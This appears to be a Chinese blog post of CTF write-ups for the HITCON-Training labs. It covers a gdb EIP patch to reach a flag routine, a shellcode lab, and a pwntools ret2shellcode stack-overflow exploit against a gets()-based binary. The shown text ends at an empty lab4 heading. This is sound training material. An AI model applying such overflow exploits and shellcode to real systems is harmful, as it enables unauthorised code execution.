---
title: HITCON-training
date: 2018-03-22 23:34:59
tags: CTF
---



## Github:

https://github.com/scwuaptx/HITCON-Training

<!--more-->

## lab1

```
#include <stdio.h>
#include <unistd.h>



void get_flag(){
        int fd ;
        int password;
        int magic ;
        char key[] = "Do_you_know_why_my_teammate_Orange_is_so_angry???";
        char cipher[] = {7, 59, 25, 2, 11, 16, 61, 30, 9, 8, 18, 45, 40, 89, 10, 0, 30, 22, 0, 4, 85, 22, 8, 31, 7, 1, 9, 0, 126, 28, 62, 10, 30, 11, 107, 4, 66, 60, 44, 91, 49, 85, 2, 30, 33, 16, 76, 30, 66};
        fd = open("/dev/urandom",0);
        read(fd,&password,4);
        printf("Give me maigc :");
        scanf("%d",&magic);
        if(password == magic){
                for(int i = 0 ; i < sizeof(cipher) ; i++){
                        printf("%c",cipher[i]^key[i]);
                }
        }
}


int main(){
        setvbuf(stdout,0,2,0);
        get_flag();
        return 0 ;
}

```

看题目提示是让我们熟悉工具的使用，那么这里直接修改逻辑就行

{%asset_img 0.png%}

gdb下好断点 

b *0x08048720

然后跑起来，修改eip的值为0x8048724

也就是让程序直接跳转到计算flag的流程中去

{%asset_img 1.png%}



## lab2



让我们输入shellcode然后执行

{%asset_img 2.png %}

因为以前编写shellcode都是用生成的，所以就参考着给的答案自己再本地修改了下，新建了一个flag文件，然后运行修改后的shellcode

{%asset_img 3.png%}





## lab3 

```
#include <stdio.h>

char name[50];

int main(){
        setvbuf(stdout,0,2,0);
        printf("Name:");
        read(0,name,50);
        char buf[20];
        printf("Try your best:");
        gets(buf);
        return ;
}

```

一个简单的栈溢出漏洞

```
from pwn import *

p = process('./ret2sc')

payload = ''
payload += 'a'*32 + p32(0x804A060)

shellcode = asm(shellcraft.linux.sh())


p.recvuntil('Name:')

p.sendline(shellcode)


p.recvuntil('Try your best:')

p.sendline(payload)

p.interavtive()

```



## lab4

